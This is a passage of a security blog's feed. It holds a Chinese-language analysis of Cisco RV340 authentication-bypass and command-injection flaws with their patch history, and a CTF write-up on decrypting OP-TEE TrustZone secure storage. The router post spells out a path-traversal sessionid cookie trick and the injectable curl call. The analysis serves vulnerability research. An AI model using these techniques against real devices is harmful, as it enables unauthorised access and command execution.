src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="Ethereum" scheme="https://bestwing.me/tags/Ethereum/"/>
    
    <category term="contracts" scheme="https://bestwing.me/tags/contracts/"/>
    
  </entry>
  
  <entry>
    <title>Pwning a Cisco RV340  漏洞分析（CVE-2022-20705 和 CVE-2022-20707</title>
    <link href="https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html"/>
    <id>https://bestwing.me/Pwning%20a%20Cisco%20RV340%20%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2022-20705%20%E5%92%8C%20CVE-2022-20707.html</id>
    <published>2022-04-01T16:00:00.000Z</published>
    <updated>2022-04-03T11:30:35.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>原作者用到了四个漏洞， 我这里简单分析其中两个，分别是  CVE-2022-20705 和 CVE-2022-20707</p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>影响版本： RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img</p><p><a href="https://blog.relyze.com/2022/04/pwning-cisco-rv340-with-4-bug-chain.html">Relyze Software Limited - Advanced Software Analysis: Pwning a Cisco RV340 with a 4 bug chain exploit</a></p><h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><p><a href="https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.26?catid=268437899">Software Download - Cisco Systems</a></p><h2 id="CVE-2022-20705-Improper-Session-Management-Vulnerability"><a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability" class="headerlink" title="CVE-2022-20705 Improper Session Management Vulnerability"></a>CVE-2022-20705 Improper Session Management Vulnerability</h2><p>Nginx 配置不当加上 upload.cgi 对 cookie 两者处理不一致导致的授权绕过。</p><p>首先 nginx 对 upload 模块的 session 的处理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ cat web.upload.conf</span><br><span class="line">location &#x2F;form-file-upload &#123;</span><br><span class="line">include uwsgi_params;</span><br><span class="line">proxy_buffering off;</span><br><span class="line">uwsgi_modifier1 9;</span><br><span class="line">uwsgi_pass 127.0.0.1:9003;</span><br><span class="line">uwsgi_read_timeout 3600;</span><br><span class="line">uwsgi_send_timeout 3600;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location &#x2F;upload &#123;</span><br><span class="line">set $deny 1;</span><br><span class="line"></span><br><span class="line">        if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">                set $deny &quot;0&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($deny &#x3D; &quot;1&quot;) &#123;</span><br><span class="line">                return 403;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">upload_pass &#x2F;form-file-upload;</span><br><span class="line">upload_store &#x2F;tmp&#x2F;upload;</span><br><span class="line">upload_store_access user:rw group:rw all:rw;</span><br><span class="line">upload_set_form_field $upload_field_name.name &quot;$upload_file_name&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.content_type &quot;$upload_content_type&quot;;</span><br><span class="line">upload_set_form_field $upload_field_name.path &quot;$upload_tmp_path&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.md5&quot; &quot;$upload_file_md5&quot;;</span><br><span class="line">upload_aggregate_form_field &quot;$upload_field_name.size&quot; &quot;$upload_file_size&quot;;</span><br><span class="line">upload_pass_form_field &quot;^.*$&quot;;</span><br><span class="line">upload_cleanup 400 404 499 500-505;</span><br><span class="line">upload_resumable on;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现， 这里是判断如果 <code>/tmp/websession/token/$cookie_sessionid</code> 文件存在,则返回。  注意这里的 <code>$cookie_sessionid</code> 是由用户在 HTTP 请求中传入的。可以看到这里的文件没有判断是否存在 <code>../../</code>  。因此如果我们跨目录指向一个存在的文件就可能造成授权绕过。像这里作者使用的是  <code>../../../etc/firmware_version</code>。 </p><p>虽然在 <code>upload.cgi</code> 对 HTTP_COOKIE 进行了正则校验</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v16 = strcmp_1(REQUEST_URI, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (v16 != <span class="number">0</span>) &#123;</span><br><span class="line">    v17 = strcmp_1(REQUEST_URI, <span class="string">&quot;/upload&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (v17 == <span class="number">0</span> &amp;&amp; HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if the URI is /upload and we have a sessionid in the cookie</span></span><br><span class="line">        v18 = strlen_1(HTTP_COOKIE);</span><br><span class="line">        <span class="keyword">if</span> (v18 &lt; <span class="number">81</span>) &#123; <span class="comment">// sanity check sessionid characters</span></span><br><span class="line">            v19 = match_regex(<span class="string">&quot;^[A-Za-z0-9+=/]*$&quot;</span>, HTTP_COOKIE);</span><br><span class="line">            <span class="keyword">if</span> (v19 == <span class="number">0</span>) &#123;</span><br><span class="line">                v20 = StrBufToStr(local_0x44);</span><br><span class="line">                func_0x2684(HTTP_COOKIE, content_destination, content_option, content_pathparam, v20, content_cert_name, content_cert_type, content_password);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在程序没有考虑用户在  HTTP cookie 中传入多个 session_id 的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (HTTP_COOKIE != <span class="number">0</span>) &#123; <span class="comment">// if an cookie is available</span></span><br><span class="line">    StrBufSetStr(cookie_str, HTTP_COOKIE);</span><br><span class="line">    __s2 = StrBufToStr(cookie_str);</span><br><span class="line">    next_semicolon = strtok_r(__s2, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// start to split the semicolon deliminated cookie</span></span><br><span class="line">    HTTP_COOKIE = <span class="number">0</span>; <span class="comment">// this variable will become the sessionid string</span></span><br><span class="line">    <span class="keyword">while</span> (next_semicolon != <span class="number">0</span>) &#123;</span><br><span class="line">        sessionid = <span class="built_in">strstr</span>(next_semicolon, <span class="string">&quot;sessionid=&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (sessionid != <span class="number">0</span>) &#123; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">            HTTP_COOKIE = sessionid + <span class="number">10</span>; <span class="comment">// advance past &quot;sessionid=&quot; and set the value</span></span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        next_semicolon = strtok_r(<span class="number">0</span>, <span class="string">&quot;;&quot;</span>, &amp;saveptr); <span class="comment">// keep searching</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么如果设置两个 seesionid ， 第一个为 <code>../../../etc/frimware_version</code> ， 第二个为可以通过正则的有效字符。</p><p>最后我们就可以用授权的状态访问 <code>upload.cgi</code> 了。</p><h2 id="CVE-2022-20707-Command-Injection"><a href="#CVE-2022-20707-Command-Injection" class="headerlink" title="CVE-2022-20707 Command Injection"></a>CVE-2022-20707 Command Injection</h2><p>作者在 <code>upload.cgi</code> 里找到了一个命令注入。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (json_obj != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">json_str = json_object_to_json_string(json_obj);</span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(&amp;buff, <span class="string">&quot;curl %s --cookie &#x27;sessionid=%s&#x27; -X POST -H &#x27;Content-Type: application/json&#x27; -d &#x27;%s&#x27;&quot;</span>, v3, sessionid, json_str);</span><br><span class="line"></span><br><span class="line">debug(<span class="string">&quot;curl_cmd=%s&quot;</span>, &amp;buff);</span><br><span class="line"></span><br><span class="line">__stream = popen(&amp;buff, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__stream != <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">fread_1(&amp;buff[<span class="number">2048</span>], <span class="number">2048</span>, <span class="number">1</span>, __stream);</span><br><span class="line"></span><br><span class="line">fclose_1(__stream);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的的 json_str 没有校验， 会造成命令注入。</p><h2 id="Related-vulnerability-tracking"><a href="#Related-vulnerability-tracking" class="headerlink" title="Related vulnerability tracking"></a>Related vulnerability tracking</h2><p>我们之前分析了 CVE-2022-20699-cisco-RV34X 的时候，注意到一个补丁， 修补了 Nginx 的配置不当的漏洞。然后今天和 @leommxj 一起追溯了一下 cisco 的修补历史。</p><h3 id="Firmware-version-1-0-03-19"><a href="#Firmware-version-1-0-03-19" class="headerlink" title="Firmware version 1.0.03.19"></a>Firmware version 1.0.03.19</h3><p>nginx 对调用 upload.cgi 没有任何的校验， 因此可以访问 upload.cgi ， 还出两个漏洞 #CVE-2020-3451 #CVE-2020-3453</p><p>相关的漏洞信息为:</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1100/">ZDI-20-1100 | Zero Day Initiative</a><br><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1101/">ZDI-20-1101 | Zero Day Initiative</a><br><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv-osinj-rce-pwTkPCJv">Cisco Small Business RV340 Series Routers Command Injection and Remote Code Execution Vulnerabilities</a></p><h3 id="Firmware-version-1-0-03-21"><a href="#Firmware-version-1-0-03-21" class="headerlink" title="Firmware version 1.0.03.21"></a>Firmware version 1.0.03.21</h3><p>之后有个老哥发现 cisco 虽然加行了授权校验，但是加得不行。</p><p>这加之前和加之后的 diff：<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202204021729670.png"></a></p><p>这个修复有一个致命的缺陷。逻辑是这样的，任何非空的授权标头都会将 $deny 设置为“0”。因此，从字面上发送任何看起来有效的授权标头作为请求/上传的一部分将绕过授权检查。</p><p>相关漏洞信息为： </p><p>#CVE-2021-1473 #CVE-2021-1472<br><a href="https://www.iot-inspector.com/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/">Advisory: Cisco RV34X Series - Authentication Bypass and Remote Command Execution - IoT Inspector (iot-inspector.com)</a></p><h3 id="Firmware-version-1-0-03-22"><a href="#Firmware-version-1-0-03-22" class="headerlink" title="Firmware version 1.0.03.22"></a>Firmware version 1.0.03.22</h3><p>然后这个版本之后去掉了上图 13 行的 nginx 配置。但是出现了此次 <a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 这个漏洞了。</p><h3 id="Firmware-version-1-0-0-3-26"><a href="#Firmware-version-1-0-0-3-26" class="headerlink" title="Firmware version 1.0.0.3.26"></a>Firmware version 1.0.0.3.26</h3><p>最新版本的 nginx 现在配置文件如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">location &#x2F;upload &#123;</span><br><span class="line">    set $deny 0;</span><br><span class="line"></span><br><span class="line">    if (-f &#x2F;tmp&#x2F;websession&#x2F;token&#x2F;$cookie_sessionid) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($cookie_sessionid ~* &quot;^[a-f0-9]&#123;64&#125;&quot;) &#123;</span><br><span class="line">            set $deny &quot;$&#123;deny&#125;2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($deny !&#x3D; &quot;012&quot;) &#123;</span><br><span class="line">            return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>增加了一个正则判断。</p><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><p>一个点有意思的是， 这<a href="#CVE-2022-20705-Improper-Session-Management-Vulnerability">CVE-2022-20705</a> 作者 和 <a href="#Firmware-version-1-0-03-21">CVE-2021-1473</a> 作者用到的命令注入和我当时挖到<a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-rv340-cmdinj-rcedos-pY8J3qfy">两个编号</a> #CVE-2021-1609 和 #CVE-2021-1610  的漏洞点在一行代码里，这意思就是这行代码一共出了 4 个漏洞编号</p><p>以后挖 IoT 漏洞也要多注意一下 web 相关的配置了。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2022-20705" scheme="https://bestwing.me/tags/CVE-2022-20705/"/>
    
    <category term="CVE-2022-20707" scheme="https://bestwing.me/tags/CVE-2022-20707/"/>
    
    <category term="cisco" scheme="https://bestwing.me/tags/cisco/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-4th TrustZone challenge Writeup</title>
    <link href="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"/>
    <id>https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html</id>
    <published>2022-01-23T16:00:00.000Z</published>
    <updated>2022-01-25T05:25:15.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>第四届 realworldctf 我和 @chennan 出了三个题目，分别是  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>， 其中   <code>Trust or Not</code>, <code>UnTrustZone</code>  是和 TrustZone 相关的题目。</p><h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p><p>TrustZone是基于硬件的安全功能，它通过对原有硬件架构进行修改，在处理器层次引入了两个不同权限的保护域——安全世界和普通世界，任何时刻处理器仅在其中的一个环境内运行。同时这两个世界完全是硬件隔离的，并具有不同的权限，正常世界中运行的应用程序或操作系统访问安全世界的资源受到严格的限制，反过来安全世界中运行的程序可以正常访问正常世界中的资源。这种两个世界之间的硬件隔离和不同权限等属性为保护应用程序的代码和数据提供了有效的机制：通常正常世界用于运行商品操作系统（例如Android、iOS等），该操作系统提供了正常执行环境（Rich Execution Environment，REE）；安全世界则始终使用安全的小内核（TEE-kernel）提供可信执行环境（Trusted Execution Environment，TEE），机密数据可以在TEE中被存储和访问。</p><h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>题目描述：</p><blockquote><p>Trust or Not</p><p>Score: <em>357</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure><p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p><p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure><p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p></blockquote><h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>要解决这个题目，首先要了解什么是安全存储。 数据要么以某种加密/授权的方式存储在linux文件系统<code>/data/tee</code>中，要么存储在Emmc RPMB（Replay Protected Memory Block）分区中。这次的相关题目主要使用了 <code>OP-TEE</code>的开源项目，其更详细的信息可以在<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEE文档</a> 中找到。</p><p> **Hardware Unique Key （HUK） ** </p><p>大多数设备都有某种硬件唯一密钥（HUK），主要用于派生其他密钥。例如，当派生密钥用于安全存储等时，可以使用 HUK 派生。HUK 的重要之处在于它需要得到很好的保护，并且在最好的情况下，HUK 永远不应该直接从软件读取，甚至不应该从安全方面读取。有不同的解决方案，加密加速器可能支持它，或者，它可能涉及另一个安全的协处理器。</p><p> <strong>Secure Storage Key （SSK）</strong> </p><p>SSK是每个设备的密钥，在OP-TEE启动时生成并存储在安全内存中。SSK用于派生TA存储密钥（TSK）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256 (HUK, Chip ID || “static string”)</span><br></pre></td></tr></table></figure><p>获取硬件唯一密钥（HUK）和芯片ID的功能取决于平台实现。目前，OP-TEE 系统中每台设备只有一把 SSK，用于安全存储子系统。但是，为了将来，我们可能需要为每台设备使用生成 SSK 的相同算法为不同的子系统创建不同的密钥。为不同子系统生成不同的密钥的简单方法是使用不同的静态生成密钥的字符串。</p><p> <strong>Trusted Application Storage Key （TSK）</strong>  </p><p>TA存储密钥</p><p>TSK是每个受信任的应用程序密钥，由SSK和TA的标识符（UUID）生成。它被用来保护FEK，换句话说，用来加密/解密FEK。</p><p>代码实现：<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment"> * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">      TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line"><span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_hmac 这里使用的是 HMAC_SHA256</p><p>最后就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure><p><strong>File Encryption Key （FEK）</strong> </p><p>当一个新的TEE文件被创建时，密钥管理器将通过 PRNG（pesudo随机数生成器）为TEE文件生成一个新的 FEK，并将加密的 FEK 存储在 meta 文件中。FEK 用于对存储在 meta 文件中的TEE文件信息或块文件中的数据进行加密/解密。</p><h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>通过逆向和比对OP-Tee的源代码，希望选手能发现 <code>HUK</code>没有被设置。然后flag被加密了且存储在 <code>/data/tee/2</code> 文件里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么只要分析下安全存储的过程，可以参考如图：</p><p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" alt="Block Data Encryption"></a></p><p>思路就大概是</p><ol><li>通过 <code>HUK </code> 和 <code>chip id</code> 计算出 <code>SSK</code></li><li>通过计算出来的<code>SSk</code> 和 <code>TA UUID</code>计算出 <code>TSK</code></li><li>通过计算出的 <code>TSK</code> 和 被加密的 <code>FEK</code> 计算出明文 <code>FEK</code> </li><li>最后通过 <code>FEK</code> 解出明文的数据</li></ol><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p><p>其中被加密的 <code>FEK</code> 存储在 <code>/data/tee/2</code> 文件中，可以参考如下 010 tempte结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">struct tee_fs_htree_meta meta;</span><br><span class="line">UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span 